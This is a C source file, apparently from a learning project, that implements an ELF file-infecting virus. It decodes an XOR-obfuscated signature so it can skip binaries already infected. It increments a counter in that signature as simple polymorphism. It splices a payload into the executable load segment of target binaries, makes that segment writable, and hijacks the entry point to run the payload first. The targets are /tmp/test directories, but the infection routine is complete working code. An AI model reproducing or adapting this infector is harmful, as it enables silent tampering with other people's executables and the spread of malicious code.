#define _GNU_SOURCE

#include "../incl/war.h"
#include "payload.h"

static unsigned char g_signature[] = {
    0x15, 0x23, 0x30, 0x62, 0x34, 0x27, 0x30, 0x31,
    0x2b, 0x2d, 0x2c, 0x62, 0x73, 0x6c, 0x72, 0x62,
    0x6a, 0x21, 0x6b, 0x2d, 0x26, 0x27, 0x26, 0x62,
    0x0d, 0x21, 0x36, 0x62, 0x6f, 0x62, 0x70, 0x72,
    0x70, 0x74, 0x62, 0x20, 0x3b, 0x62, 0x26, 0x23,
    0x34, 0x25, 0x23, 0x2e, 0x2e, 0x27, 0x62, 0x6f,
    0x62, 0x00
};

void    ft_obfuscation(t_war *war)
{
    int i = 0;
    while (g_signature[i])
    {
        war->decrypted[i] = g_signature[i] ^ KEY;
        i++;
    }
    war->decrypted[i] = '\0';
}

void    ft_update_payload(t_war *war, char *str, int count)
{
    off_t   offset;
    int     fd;

    offset = (unsigned char *)war->signd - war->elf;
    offset += count;
    
    fd = open(war->binary, O_RDWR);
    if (fd == -1)
        return;
    if (lseek(fd, offset, SEEK_SET) == -1)
    {
        close(fd);
        return;
    }
    write(fd, str, strlen(str));
    close(fd);
    return;
}

void    ft_polymorphism(t_war *war)
{
    char    *buffer;
    char    *aux = war->signd;
    int     value = 0;
    int     start = ft_strlen(war->decrypted);
    int     offset = start;
    int     len = ft_couter(war->signd, start) + 1;

    buffer = malloc(len);
    if (!buffer)
        return;
    while (aux[offset] != '\0')
    {
        buffer[value] = aux[offset];
        value++;
        offset++;
    }
    buffer[value] = '\0';
    value = 0;
    value = atoi(buffer);
    value++;
    snprintf(buffer, len, "%05d", value);
    ft_update_payload(war, buffer, start);
    free(buffer);
}

char    *ft_getdir(int i)
{
    if (i == 0)
        return ("/tmp/test");
    return ("/tmp/test2");
}

int     ft_is_infection(t_war *war)
{
    ft_obfuscation(war);
    war->signd = memmem(war->elf, war->file_size, war->decrypted, strlen(war->decrypted));
    if (war->signd)
    {
        ft_polymorphism(war);
        return (1);
    }
    return (0);
}

void    ft_infect(t_war *war)
{
    unsigned char   *payload;
    // unsigned char   marker_ret[]    = {0xbe, 0xba, 0xfe, 0xca};
    char            full_signature[1069];
    uint64_t        new_vaddr;
    Elf64_Phdr      *phdr;
    Elf64_Phdr      modified_phdr;
    Elf64_Addr      new_entry;
    off_t           offset_phdr;
    off_t           original_offset;
    uint64_t        original_filesz;
    int             i = 0;
    int             phdr_index = -1;

    payload = malloc(src_payload_bin_len);
    if (!payload)
        return;
    memcpy(payload, src_payload_bin, src_payload_bin_len);

    phdr = (Elf64_Phdr *)(war->elf + war->header->e_phoff);

    while (i < war->header->e_phnum)
    {
        if (phdr[i].p_type == PT_LOAD && (phdr[i].p_flags & PF_X))
        {
            original_offset = phdr[i].p_offset;
            original_filesz = phdr[i].p_filesz;
            new_vaddr = phdr[i].p_vaddr + phdr[i].p_filesz;
            modified_phdr = phdr[i];
            phdr_index = i;
            break;
        }
        i++;
    }

    if (phdr_index == -1)
    {
        munmap(war->elf, war->file_size);
        close(war->fd);
        free(payload);
        return;
    }

    // AHORA new_vaddr tiene el valor correcto
    memcpy(payload + 2, &new_vaddr, sizeof(uint64_t));
    memcpy(payload + 10, &war->header->e_entry, sizeof(uint64_t));

    phdr[phdr_index].p_filesz += src_payload_bin_len;
    phdr[phdr_index].p_memsz += src_payload_bin_len;
    phdr[phdr_index].p_flags |= PF_W;
    war->header->e_entry = new_vaddr;
    modified_phdr = phdr[phdr_index];

    /*  4. Escribir en el disco   */
    new_entry = war->header->e_entry;
    offset_phdr = war->header->e_phoff + (phdr_index * sizeof(Elf64_Phdr));
    
    munmap(war->elf, war->file_size);
    close(war->fd);  
    war->fd = open(war->binary, O_RDWR | O_NOFOLLOW);

    // Escribir el nuevo e_entry
    lseek(war->fd, 24, SEEK_SET);
    write(war->fd, &new_entry, sizeof(Elf64_Addr));
    
    // Escribir el Program Header modificado
    lseek(war->fd, offset_phdr, SEEK_SET);
    write(war->fd, &modified_phdr, sizeof(Elf64_Phdr));

    // Escribir el payload en el offset correcto (no al final)
    lseek(war->fd, original_offset + original_filesz, SEEK_SET);
    write(war->fd, payload, src_payload_bin_len);
    
    // Escribir la firma compleya con el nº inicial '39774'
    snprintf(full_signature, sizeof(full_signature), "%s39774", war->decrypted);
    lseek(war->fd, 0, SEEK_END);
    write(war->fd, full_signature, strlen(full_signature));
    close(war->fd);
    free(payload);
    return;
}
